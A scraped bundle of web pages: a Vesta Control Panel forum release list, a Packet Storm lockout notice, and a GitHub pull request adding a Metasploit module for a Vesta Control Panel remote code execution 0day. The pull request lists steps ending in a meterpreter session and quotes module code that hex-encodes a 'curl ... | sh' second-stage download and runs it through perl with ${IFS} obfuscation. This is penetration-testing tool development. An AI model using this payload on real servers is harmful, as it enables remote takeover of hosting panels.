=== Content from forum.vestacp.com_a135230b_20250119_125945.html ===


# Vesta Control Panel - Forum

Community Forum

[Skip to content](#start_here)

Search

[Advanced search](./search.php?sid=713fced229f853f70b2ac8241b93193f "Advanced search")

* Quick links

  + [Main site](https://vestacp.com/)
  + [Github repo](https://github.com/serghey-rodin/vesta)
  + [Google Search](/app.php/googlesearch)
* [FAQ](/app.php/help/faq?sid=713fced229f853f70b2ac8241b93193f "Frequently Asked Questions")
* [Login](./ucp.php?mode=login&sid=713fced229f853f70b2ac8241b93193f "Login")

* [Board index](./index.php?sid=713fced229f853f70b2ac8241b93193f)
  [Vesta](./viewforum.php?f=39&sid=713fced229f853f70b2ac8241b93193f)
  [Updates](./viewforum.php?f=25&sid=713fced229f853f70b2ac8241b93193f)
* [Search](./search.php?sid=713fced229f853f70b2ac8241b93193f "View the advanced search options")

We are happy to announce that Vesta is back under active development as of 25 February 2024. We are working on Vesta 2.0 and expect to release it by the end of 2024. Read more about it: <https://vestacp.com/docs/vesta-2-development>

## [Updates](./viewforum.php?f=25&sid=713fced229f853f70b2ac8241b93193f)

Information about new releases and bug fixes

[New Topic](./posting.php?mode=post&f=25&sid=713fced229f853f70b2ac8241b93193f "Post a new topic")

Search

[Advanced search](./search.php?sid=713fced229f853f70b2ac8241b93193f "Advanced search")

35 topics

* 1
* [2](./viewforum.php?f=25&sid=713fced229f853f70b2ac8241b93193f&start=25)
* [Next](./viewforum.php?f=25&sid=713fced229f853f70b2ac8241b93193f&start=25)

* Topics
  Replies
  Views
  Last post

* [0.9.8-26](./viewtopic.php?f=25&t=19537&sid=713fced229f853f70b2ac8241b93193f)

  Last post by [imperio](./memberlist.php?mode=viewprofile&u=1629&sid=713fced229f853f70b2ac8241b93193f) ¬´ [Wed Jan 22, 2020 8:41 am](./viewtopic.php?f=25&t=19537&p=80728&sid=713fced229f853f70b2ac8241b93193f#p80728 "Go to last post")

  by [imperio](./memberlist.php?mode=viewprofile&u=1629&sid=713fced229f853f70b2ac8241b93193f) ¬ª Wed Jan 22, 2020 8:41 am

  0 Replies
  176384 Views
  Last post by [imperio](./memberlist.php?mode=viewprofile&u=1629&sid=713fced229f853f70b2ac8241b93193f)

  Wed Jan 22, 2020 8:41 am
* [0.9.8-25 (bugfixes)](./viewtopic.php?f=25&t=19536&sid=713fced229f853f70b2ac8241b93193f)

  Last post by [imperio](./memberlist.php?mode=viewprofile&u=1629&sid=713fced229f853f70b2ac8241b93193f) ¬´ [Wed Jan 22, 2020 8:36 am](./viewtopic.php?f=25&t=19536&p=80727&sid=713fced229f853f70b2ac8241b93193f#p80727 "Go to last post")

  by [imperio](./memberlist.php?mode=viewprofile&u=1629&sid=713fced229f853f70b2ac8241b93193f) ¬ª Wed Jan 22, 2020 8:36 am

  0 Replies
  15492 Views
  Last post by [imperio](./memberlist.php?mode=viewprofile&u=1629&sid=713fced229f853f70b2ac8241b93193f)

  Wed Jan 22, 2020 8:36 am
* [0.9.8-24](./viewtopic.php?f=25&t=18599&sid=713fced229f853f70b2ac8241b93193f)

  Last post by [imperio](./memberlist.php?mode=viewprofile&u=1629&sid=713fced229f853f70b2ac8241b93193f) ¬´ [Wed Apr 17, 2019 9:22 am](./viewtopic.php?f=25&t=18599&p=77084&sid=713fced229f853f70b2ac8241b93193f#p77084 "Go to last post")

  by [imperio](./memberlist.php?mode=viewprofile&u=1629&sid=713fced229f853f70b2ac8241b93193f) ¬ª Wed Apr 17, 2019 9:22 am

  0 Replies
  33452 Views
  Last post by [imperio](./memberlist.php?mode=viewprofile&u=1629&sid=713fced229f853f70b2ac8241b93193f)

  Wed Apr 17, 2019 9:22 am
* [0.9.8-23 (security)](./viewtopic.php?f=25&t=17785&sid=713fced229f853f70b2ac8241b93193f)

  Last post by [imperio](./memberlist.php?mode=viewprofile&u=1629&sid=713fced229f853f70b2ac8241b93193f) ¬´ [Thu Oct 18, 2018 2:44 pm](./viewtopic.php?f=25&t=17785&p=73942&sid=713fced229f853f70b2ac8241b93193f#p73942 "Go to last post")

  by [imperio](./memberlist.php?mode=viewprofile&u=1629&sid=713fced229f853f70b2ac8241b93193f) ¬ª Thu Oct 18, 2018 2:44 pm

  0 Replies
  22236 Views
  Last post by [imperio](./memberlist.php?mode=viewprofile&u=1629&sid=713fced229f853f70b2ac8241b93193f)

  Thu Oct 18, 2018 2:44 pm
* [0.9.8-22 (security)](./viewtopic.php?f=25&t=17170&sid=713fced229f853f70b2ac8241b93193f)

  Last post by [imperio](./memberlist.php?mode=viewprofile&u=1629&sid=713fced229f853f70b2ac8241b93193f) ¬´ [Sun Jun 24, 2018 2:13 pm](./viewtopic.php?f=25&t=17170&p=71465&sid=713fced229f853f70b2ac8241b93193f#p71465 "Go to last post")

  by [imperio](./memberlist.php?mode=viewprofile&u=1629&sid=713fced229f853f70b2ac8241b93193f) ¬ª Sun Jun 24, 2018 2:13 pm

  0 Replies
  22837 Views
  Last post by [imperio](./memberlist.php?mode=viewprofile&u=1629&sid=713fced229f853f70b2ac8241b93193f)

  Sun Jun 24, 2018 2:13 pm
* [0.9.8-21 (security)](./viewtopic.php?f=25&t=17016&sid=713fced229f853f70b2ac8241b93193f)

  Last post by [imperio](./memberlist.php?mode=viewprofile&u=1629&sid=713fced229f853f70b2ac8241b93193f) ¬´ [Tue May 29, 2018 6:07 pm](./viewtopic.php?f=25&t=17016&p=70931&sid=713fced229f853f70b2ac8241b93193f#p70931 "Go to last post")

  by [imperio](./memberlist.php?mode=viewprofile&u=1629&sid=713fced229f853f70b2ac8241b93193f) ¬ª Tue May 29, 2018 6:07 pm

  0 Replies
  16209 Views
  Last post by [imperio](./memberlist.php?mode=viewprofile&u=1629&sid=713fced229f853f70b2ac8241b93193f)

  Tue May 29, 2018 6:07 pm
* [0.9.8-20 (security)](./viewtopic.php?f=25&t=16575&sid=713fced229f853f70b2ac8241b93193f)

  Last post by [skurudo](./memberlist.php?mode=viewprofile&u=5073&sid=713fced229f853f70b2ac8241b93193f) ¬´ [Tue Apr 10, 2018 8:55 am](./viewtopic.php?f=25&t=16575&p=69296&sid=713fced229f853f70b2ac8241b93193f#p69296 "Go to last post")

  Replies: **1**
  by [imperio](./memberlist.php?mode=viewprofile&u=1629&sid=713fced229f853f70b2ac8241b93193f) ¬ª Sun Apr 08, 2018 10:36 pm

  1 Replies
  34578 Views
  Last post by [skurudo](./memberlist.php?mode=viewprofile&u=5073&sid=713fced229f853f70b2ac8241b93193f)

  Tue Apr 10, 2018 8:55 am
* [0.9.8-19 (bugfixes)](./viewtopic.php?f=25&t=16011&sid=713fced229f853f70b2ac8241b93193f)

  Last post by [imperio](./memberlist.php?mode=viewprofile&u=1629&sid=713fced229f853f70b2ac8241b93193f) ¬´ [Mon Jan 22, 2018 2:58 pm](./viewtopic.php?f=25&t=16011&p=66176&sid=713fced229f853f70b2ac8241b93193f#p66176 "Go to last post")

  by [imperio](./memberlist.php?mode=viewprofile&u=1629&sid=713fced229f853f70b2ac8241b93193f) ¬ª Mon Jan 22, 2018 2:58 pm

  0 Replies
  17624 Views
  Last post by [imperio](./memberlist.php?mode=viewprofile&u=1629&sid=713fced229f853f70b2ac8241b93193f)

  Mon Jan 22, 2018 2:58 pm
* [0.9.8-18](./viewtopic.php?f=25&t=15908&sid=713fced229f853f70b2ac8241b93193f)

  Last post by [imperio](./memberlist.php?mode=viewprofile&u=1629&sid=713fced229f853f70b2ac8241b93193f) ¬´ [Tue Jan 09, 2018 8:49 pm](./viewtopic.php?f=25&t=15908&p=65729&sid=713fced229f853f70b2ac8241b93193f#p65729 "Go to last post")

  by [imperio](./memberlist.php?mode=viewprofile&u=1629&sid=713fced229f853f70b2ac8241b93193f) ¬ª Tue Jan 09, 2018 8:49 pm

  0 Replies
  16505 Views
  Last post by [imperio](./memberlist.php?mode=viewprofile&u=1629&sid=713fced229f853f70b2ac8241b93193f)

  Tue Jan 09, 2018 8:49 pm
* [0.9.8-17](./viewtopic.php?f=25&t=13259&sid=713fced229f853f70b2ac8241b93193f)

  Last post by [skurudo](./memberlist.php?mode=viewprofile&u=5073&sid=713fced229f853f70b2ac8241b93193f) ¬´ [Wed Nov 30, 2016 11:51 am](./viewtopic.php?f=25&t=13259&p=53453&sid=713fced229f853f70b2ac8241b93193f#p53453 "Go to last post")

  by [skurudo](./memberlist.php?mode=viewprofile&u=5073&sid=713fced229f853f70b2ac8241b93193f) ¬ª Wed Nov 30, 2016 11:51 am

  0 Replies
  28917 Views
  Last post by [skurudo](./memberlist.php?mode=viewprofile&u=5073&sid=713fced229f853f70b2ac8241b93193f)

  Wed Nov 30, 2016 11:51 am
* [0.9.8-16](./viewtopic.php?f=25&t=11892&sid=713fced229f853f70b2ac8241b93193f)

  Last post by [skurudo](./memberlist.php?mode=viewprofile&u=5073&sid=713fced229f853f70b2ac8241b93193f) ¬´ [Wed Jun 29, 2016 7:10 pm](./viewtopic.php?f=25&t=11892&p=46284&sid=713fced229f853f70b2ac8241b93193f#p46284 "Go to last post")

  by [skurudo](./memberlist.php?mode=viewprofile&u=5073&sid=713fced229f853f70b2ac8241b93193f) ¬ª Wed Jun 29, 2016 7:10 pm

  0 Replies
  22428 Views
  Last post by [skurudo](./memberlist.php?mode=viewprofile&u=5073&sid=713fced229f853f70b2ac8241b93193f)

  Wed Jun 29, 2016 7:10 pm
* [0.9.8-15](./viewtopic.php?f=25&t=11186&sid=713fced229f853f70b2ac8241b93193f)

  Last post by [skurudo](./memberlist.php?mode=viewprofile&u=5073&sid=713fced229f853f70b2ac8241b93193f) ¬´ [Thu Apr 14, 2016 11:33 am](./viewtopic.php?f=25&t=11186&p=42400&sid=713fced229f853f70b2ac8241b93193f#p42400 "Go to last post")

  by [skurudo](./memberlist.php?mode=viewprofile&u=5073&sid=713fced229f853f70b2ac8241b93193f) ¬ª Thu Apr 14, 2016 11:33 am

  0 Replies
  21298 Views
  Last post by [skurudo](./memberlist.php?mode=viewprofile&u=5073&sid=713fced229f853f70b2ac8241b93193f)

  Thu Apr 14, 2016 11:33 am
* [0.9.8-14](./viewtopic.php?f=25&t=11185&sid=713fced229f853f70b2ac8241b93193f)

  Last post by [skurudo](./memberlist.php?mode=viewprofile&u=5073&sid=713fced229f853f70b2ac8241b93193f) ¬´ [Thu Apr 14, 2016 11:32 am](./viewtopic.php?f=25&t=11185&p=42399&sid=713fced229f853f70b2ac8241b93193f#p42399 "Go to last post")

  by [skurudo](./memberlist.php?mode=viewprofile&u=5073&sid=713fced229f853f70b2ac8241b93193f) ¬ª Thu Apr 14, 2016 11:32 am

  0 Replies
  16142 Views
  Last post by [skurudo](./memberlist.php?mode=viewprofile&u=5073&sid=713fced229f853f70b2ac8241b93193f)

  Thu Apr 14, 2016 11:32 am
* [0.9.8-12](./viewtopic.php?f=25&t=11184&sid=713fced229f853f70b2ac8241b93193f)

  Last post by [skurudo](./memberlist.php?mode=viewprofile&u=5073&sid=713fced229f853f70b2ac8241b93193f) ¬´ [Thu Apr 14, 2016 11:31 am](./viewtopic.php?f=25&t=11184&p=42398&sid=713fced229f853f70b2ac8241b93193f#p42398 "Go to last post")

  by [skurudo](./memberlist.php?mode=viewprofile&u=5073&sid=713fced229f853f70b2ac8241b93193f) ¬ª Thu Apr 14, 2016 11:31 am

  0 Replies
  15588 Views
  Last post by [skurudo](./memberlist.php?mode=viewprofile&u=5073&sid=713fced229f853f70b2ac8241b93193f)

  Thu Apr 14, 2016 11:31 am
* [0.9.8-11](./viewtopic.php?f=25&t=11183&sid=713fced229f853f70b2ac8241b93193f)

  Last post by [skurudo](./memberlist.php?mode=viewprofile&u=5073&sid=713fced229f853f70b2ac8241b93193f) ¬´ [Thu Apr 14, 2016 11:30 am](./viewtopic.php?f=25&t=11183&p=42397&sid=713fced229f853f70b2ac8241b93193f#p42397 "Go to last post")

  by [skurudo](./memberlist.php?mode=viewprofile&u=5073&sid=713fced229f853f70b2ac8241b93193f) ¬ª Thu Apr 14, 2016 11:30 am

  0 Replies
  15709 Views
  Last post by [skurudo](./memberlist.php?mode=viewprofile&u=5073&sid=713fced229f853f70b2ac8241b93193f)

  Thu Apr 14, 2016 11:30 am
* [0.9.8-10](./viewtopic.php?f=25&t=11182&sid=713fced229f853f70b2ac8241b93193f)

  Last post by [skurudo](./memberlist.php?mode=viewprofile&u=5073&sid=713fced229f853f70b2ac8241b93193f) ¬´ [Thu Apr 14, 2016 11:30 am](./viewtopic.php?f=25&t=11182&p=42396&sid=713fced229f853f70b2ac8241b93193f#p42396 "Go to last post")

  by [skurudo](./memberlist.php?mode=viewprofile&u=5073&sid=713fced229f853f70b2ac8241b93193f) ¬ª Thu Apr 14, 2016 11:30 am

  0 Replies
  16088 Views
  Last post by [skurudo](./memberlist.php?mode=viewprofile&u=5073&sid=713fced229f853f70b2ac8241b93193f)

  Thu Apr 14, 2016 11:30 am
* [0.9.8-9](./viewtopic.php?f=25&t=5289&sid=713fced229f853f70b2ac8241b93193f)

  Last post by [skid](./memberlist.php?mode=viewprofile&u=2&sid=713fced229f853f70b2ac8241b93193f) ¬´ [Sat Jun 14, 2014 9:49 am](./viewtopic.php?f=25&t=5289&p=13385&sid=713fced229f853f70b2ac8241b93193f#p13385 "Go to last post")

  by [skid](./memberlist.php?mode=viewprofile&u=2&sid=713fced229f853f70b2ac8241b93193f) ¬ª Sat Jun 14, 2014 9:49 am

  0 Replies
  42084 Views
  Last post by [skid](./memberlist.php?mode=viewprofile&u=2&sid=713fced229f853f70b2ac8241b93193f)

  Sat Jun 14, 2014 9:49 am
* [0.9.8-8](./viewtopic.php?f=25&t=4940&sid=713fced229f853f70b2ac8241b93193f)

  Last post by [skid](./memberlist.php?mode=viewprofile&u=2&sid=713fced229f853f70b2ac8241b93193f) ¬´ [Fri Apr 18, 2014 8:48 pm](./viewtopic.php?f=25&t=4940&p=11852&sid=713fced229f853f70b2ac8241b93193f#p11852 "Go to last post")

  by [skid](./memberlist.php?mode=viewprofile&u=2&sid=713fced229f853f70b2ac8241b93193f) ¬ª Fri Apr 18, 2014 8:48 pm

  0 Replies
  44975 Views
  Last post by [skid](./memberlist.php?mode=viewprofile&u=2&sid=713fced229f853f70b2ac8241b93193f)

  Fri Apr 18, 2014 8:48 pm
* [0.9.8-7](./viewtopic.php?f=25&t=4636&sid=713fced229f853f70b2ac8241b93193f)

  Last post by [skid](./memberlist.php?mode=viewprofile&u=2&sid=713fced229f853f70b2ac8241b93193f) ¬´ [Thu Feb 20, 2014 12:41 am](./viewtopic.php?f=25&t=4636&p=10095&sid=713fced229f853f70b2ac8241b93193f#p10095 "Go to last post")

  by [skid](./memberlist.php?mode=viewprofile&u=2&sid=713fced229f853f70b2ac8241b93193f) ¬ª Thu Feb 20, 2014 12:41 am

  0 Replies
  26842 Views
  Last post by [skid](./memberlist.php?mode=viewprofile&u=2&sid=713fced229f853f70b2ac8241b93193f)

  Thu Feb 20, 2014 12:41 am
* [0.9.8-6](./viewtopic.php?f=25&t=4277&sid=713fced229f853f70b2ac8241b93193f)

  Last post by [skid](./memberlist.php?mode=viewprofile&u=2&sid=713fced229f853f70b2ac8241b93193f) ¬´ [Thu Nov 28, 2013 7:06 pm](./viewtopic.php?f=25&t=4277&p=8019&sid=713fced229f853f70b2ac8241b93193f#p8019 "Go to last post")

  by [skid](./memberlist.php?mode=viewprofile&u=2&sid=713fced229f853f70b2ac8241b93193f) ¬ª Thu Nov 28, 2013 7:06 pm

  0 Replies
  27964 Views
  Last post by [skid](./memberlist.php?mode=viewprofile&u=2&sid=713fced229f853f70b2ac8241b93193f)

  Thu Nov 28, 2013 7:06 pm
* [0.9.8-5](./viewtopic.php?f=25&t=3965&sid=713fced229f853f70b2ac8241b93193f)

  Last post by [skid](./memberlist.php?mode=viewprofile&u=2&sid=713fced229f853f70b2ac8241b93193f) ¬´ [Tue Oct 15, 2013 12:29 am](./viewtopic.php?f=25&t=3965&p=7052&sid=713fced229f853f70b2ac8241b93193f#p7052 "Go to last post")

  by [skid](./memberlist.php?mode=viewprofile&u=2&sid=713fced229f853f70b2ac8241b93193f) ¬ª Tue Oct 15, 2013 12:29 am

  0 Replies
  27005 Views
  Last post by [skid](./memberlist.php?mode=viewprofile&u=2&sid=713fced229f853f70b2ac8241b93193f)

  Tue Oct 15, 2013 12:29 am
* [0.9.8-4 (bugfixes)](./viewtopic.php?f=25&t=3896&sid=713fced229f853f70b2ac8241b93193f)

  Last post by [skid](./memberlist.php?mode=viewprofile&u=2&sid=713fced229f853f70b2ac8241b93193f) ¬´ [Tue Sep 17, 2013 2:44 pm](./viewtopic.php?f=25&t=3896&p=6547&sid=713fced229f853f70b2ac8241b93193f#p6547 "Go to last post")

  by [skid](./memberlist.php?mode=viewprofile&u=2&sid=713fced229f853f70b2ac8241b93193f) ¬ª Tue Sep 17, 2013 2:44 pm

  0 Replies
  25363 Views
  Last post by [skid](./memberlist.php?mode=viewprofile&u=2&sid=713fced229f853f70b2ac8241b93193f)

  Tue Sep 17, 2013 2:44 pm
* [0.9.8-3](./viewtopic.php?f=25&t=3886&sid=713fced229f853f70b2ac8241b93193f)

  Last post by [skid](./memberlist.php?mode=viewprofile&u=2&sid=713fced229f853f70b2ac8241b93193f) ¬´ [Tue Sep 10, 2013 12:41 pm](./viewtopic.php?f=25&t=3886&p=6483&sid=713fced229f853f70b2ac8241b93193f#p6483 "Go to last post")

  by [skid](./memberlist.php?mode=viewprofile&u=2&sid=713fced229f853f70b2ac8241b93193f) ¬ª Tue Sep 10, 2013 12:41 pm

  0 Replies
  25286 Views
  Last post by [skid](./memberlist.php?mode=viewprofile&u=2&sid=713fced229f853f70b2ac8241b93193f)

  Tue Sep 10, 2013 12:41 pm
* [0.9.8-2](./viewtopic.php?f=25&t=3747&sid=713fced229f853f70b2ac8241b93193f)

  Last post by [skid](./memberlist.php?mode=viewprofile&u=2&sid=713fced229f853f70b2ac8241b93193f) ¬´ [Tue Jun 11, 2013 1:15 pm](./viewtopic.php?f=25&t=3747&p=5634&sid=713fced229f853f70b2ac8241b93193f#p5634 "Go to last post")

  by [skid](./memberlist.php?mode=viewprofile&u=2&sid=713fced229f853f70b2ac8241b93193f) ¬ª Tue Jun 11, 2013 1:15 pm

  0 Replies
  24827 Views
  Last post by [skid](./memberlist.php?mode=viewprofile&u=2&sid=713fced229f853f70b2ac8241b93193f)

  Tue Jun 11, 2013 1:15 pm
* [0.9.8-1](./viewtopic.php?f=25&t=3737&sid=713fced229f853f70b2ac8241b93193f)

  Last post by [skid](./memberlist.php?mode=viewprofile&u=2&sid=713fced229f853f70b2ac8241b93193f) ¬´ [Wed Jun 05, 2013 2:00 pm](./viewtopic.php?f=25&t=3737&p=5584&sid=713fced229f853f70b2ac8241b93193f#p5584 "Go to last post")

  by [skid](./memberlist.php?mode=viewprofile&u=2&sid=713fced229f853f70b2ac8241b93193f) ¬ª Wed Jun 05, 2013 2:00 pm

  0 Replies
  25445 Views
  Last post by [skid](./memberlist.php?mode=viewprofile&u=2&sid=713fced229f853f70b2ac8241b93193f)

  Wed Jun 05, 2013 2:00 pm

---

[New Topic](./posting.php?mode=post&f=25&sid=713fced229f853f70b2ac8241b93193f "Post a new topic")

Display: All Topics1 day7 days2 weeks1 month3 months6 months1 year
Sort by: AuthorPost timeRepliesSubjectViews
Direction: AscendingDescending

---

35 topics

* 1
* [2](./viewforum.php?f=25&sid=713fced229f853f70b2ac8241b93193f&start=25)
* [Next](./viewforum.php?f=25&sid=713fced229f853f70b2ac8241b93193f&start=25)

[Return to Board Index](./index.php?sid=713fced229f853f70b2ac8241b93193f)

#### Forum permissions

You **cannot** post new topics in this forum
You **cannot** reply to topics in this forum
You **cannot** edit your posts in this forum
You **cannot** delete your posts in this forum

* [Board index](./index.php?sid=713fced229f853f70b2ac8241b93193f)
* All times are UTC
* [Delete all board cookies](./ucp.php?mode=delete_cookies&sid=713fced229f853f70b2ac8241b93193f)
* [The team](./memberlist.php?mode=team&sid=713fced229f853f70b2ac8241b93193f)

Powered by [phpBB](https://www.phpbb.com/)¬Æ Forum Software ¬© phpBB Limited

**\*Original Author: [Brad Veryard](http://www.bradleyv.com/)**

**\*Updated to 3.2 by [MannixMD](https://twitter.com/MannixMD)**

###

### [Login](./ucp.php?mode=login&sid=713fced229f853f70b2ac8241b93193f)

Username:

Password:

[I forgot my password](./ucp.php?mode=sendpassword&sid=713fced229f853f70b2ac8241b93193f)

Remember me



=== Content from packetstormsecurity.com_a90d3ed4_20250119_125945.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

LOCKED OUT‚õî 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.

=== Content from github.com_c5936d2a_20250119_125948.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F13094)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F13094)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=rapid7%2Fmetasploit-framework)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rapid7](/rapid7)
/
**[metasploit-framework](/rapid7/metasploit-framework)**
Public

* [Notifications](/login?return_to=%2Frapid7%2Fmetasploit-framework) You must be signed in to change notification settings
* [Fork
  14.1k](/login?return_to=%2Frapid7%2Fmetasploit-framework)
* [Star
   34.6k](/login?return_to=%2Frapid7%2Fmetasploit-framework)

* [Code](/rapid7/metasploit-framework)
* [Issues
  410](/rapid7/metasploit-framework/issues)
* [Pull requests
  37](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects
  1](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

Additional navigation options

* [Code](/rapid7/metasploit-framework)
* [Issues](/rapid7/metasploit-framework/issues)
* [Pull requests](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Frapid7%2Fmetasploit-framework%2Fissues%2Fnew%2Fchoose)

By clicking ‚ÄúSign up for GitHub‚Äù, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We‚Äôll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Frapid7%2Fmetasploit-framework%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Adding Vesta Control Panel Remote Code Execution 0day #13094

 Merged

[gwillcox-r7](/gwillcox-r7)
merged 7 commits into
[rapid7:master](/rapid7/metasploit-framework/tree/master "rapid7/metasploit-framework:master")
from
[mdisec:vestacp\_exec](/mdisec/metasploit-framework/tree/vestacp_exec "mdisec/metasploit-framework:vestacp_exec")

Apr 13, 2020

 Merged

# [Adding Vesta Control Panel Remote Code Execution 0day](#top) #13094

[gwillcox-r7](/gwillcox-r7)
merged 7 commits into
[rapid7:master](/rapid7/metasploit-framework/tree/master "rapid7/metasploit-framework:master")
from
[mdisec:vestacp\_exec](/mdisec/metasploit-framework/tree/vestacp_exec "mdisec/metasploit-framework:vestacp_exec")

Apr 13, 2020

[Conversation
77](/rapid7/metasploit-framework/pull/13094)
[Commits
7](/rapid7/metasploit-framework/pull/13094/commits)
[Checks
0](/rapid7/metasploit-framework/pull/13094/checks)
[Files changed](/rapid7/metasploit-framework/pull/13094/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![mdisec](https://avatars.githubusercontent.com/u/4004716?s=60&v=4)](/mdisec)

Copy link

Contributor

### @mdisec **[mdisec](/mdisec)** commented [Mar 18, 2020](#issue-583786814) ‚Ä¢ edited by gwillcox-r7 Loading

Hi all,

It's been a while since I haven't release one of these.

PS: [#13093](https://github.com/rapid7/metasploit-framework/pull/13093) must be landed first.

## Verification

List the steps needed to make sure this thing works

* Start `msfconsole`
* `use exploit/linux/http/vestacp_exec`
* Set `RHOST`
* Set `LHOST`
* Set `USERNAME`
* Set `PASSWORD`
* Set `SRVHOST`
* Set `SRVPORT`
* Run `exploit`
* **Verify** that you are seeing `Successfully authenticated to the FTP service` in console.
* **Verify** that you are seeing `Successfully uploaded the payload as a file name` in console.
* **Verify** that you are seeing `Successfully authenticated to the HTTP Service` in console.
* **Verify** that you are seeing `Scheduled backup has ben started. Exploitation may take up to 5 minutes.` in console.
* **Verify** that you are seeing `It seems there is an active backup process ! Recheck after 30 second. Zzzzzz...` in console.
* **Verify** that you are seeing `First stage is executed ! Sending 2nd stage of the payload` in console.
* **Verify** that you are getting meterpreter session.

Technical details <https://pentest.blog/vesta-control-panel-second-order-remote-code-execution-0day-step-by-step-analysis/>

Sorry, something went wrong.

All reactions

[![@space-r7](https://avatars.githubusercontent.com/u/40177151?s=40&u=a478af0f7ed559a0bfc369dfd5ddd7e5aa5c63db&v=4)](/space-r7)
[space-r7](/space-r7)
added
[docs](/rapid7/metasploit-framework/labels/docs)
[module](/rapid7/metasploit-framework/labels/module)
labels
[Mar 18, 2020](#event-3142551254)

[![acammack-r7](https://avatars.githubusercontent.com/u/16652544?s=60&v=4)](/acammack-r7)

**[acammack-r7](/acammack-r7)**
reviewed
[Mar 19, 2020](#pullrequestreview-377770975)

 [View reviewed changes](/rapid7/metasploit-framework/pull/13094/files)

[modules/exploits/linux/http/vestacp\_exec.rb](/rapid7/metasploit-framework/pull/13094/files#diff-370e53d3038f231f80e9bae99a4e9686ea7188cbdd48ccce87295d42223c468b)

|  |  | # actual python meterpreter first stager and execute it. |
| --- | --- | --- |
|  |  | # |
|  |  | final\_payload = "curl -sSL #{@second\_stage\_url} | sh".to\_s.unpack("H\*").first |
|  |  | p = "perl${IFS}-e${IFS}'system(pack(qq,H#{final\_payload.length},,qq,#{final\_payload},))'" |

Copy link

Contributor

